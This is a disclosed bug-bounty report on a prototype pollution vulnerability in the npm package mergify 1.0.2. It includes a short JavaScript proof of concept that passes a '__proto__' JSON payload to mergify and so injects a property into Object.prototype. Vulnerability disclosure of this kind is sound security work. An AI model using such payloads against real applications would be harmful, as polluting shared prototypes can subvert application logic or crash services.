# [M] Prototype pollution attack (mergify)

## Summary
Severity: Medium
Program: Node.js third-party modules
Weakness: N/A
Reporter: dienpv
State: resolved
Disclosed: 2018-11-20T12:04:14.262Z
Source: https://hackerone.com/reports/439098

## Details
Hi team,
I would like to report a prototype pollution vulnerability in mergify
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** mergify
**version:** 1.0.2
**npm page:** `https://www.npmjs.com/package/mergify`

## Module Description

> Merge objects deeply

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report  #438274
mergify is vulnerable when it performs a recursive copy of the specified objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var mergify= require('mergify');
var payload = '{"__proto__":{"polluted":"mergify_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
mergify({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up
- I contacted the maintainer to let them know: [Y/N] 
- I opened an issue in the related repository: [Y/N] 

Thanks!

```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/439098_
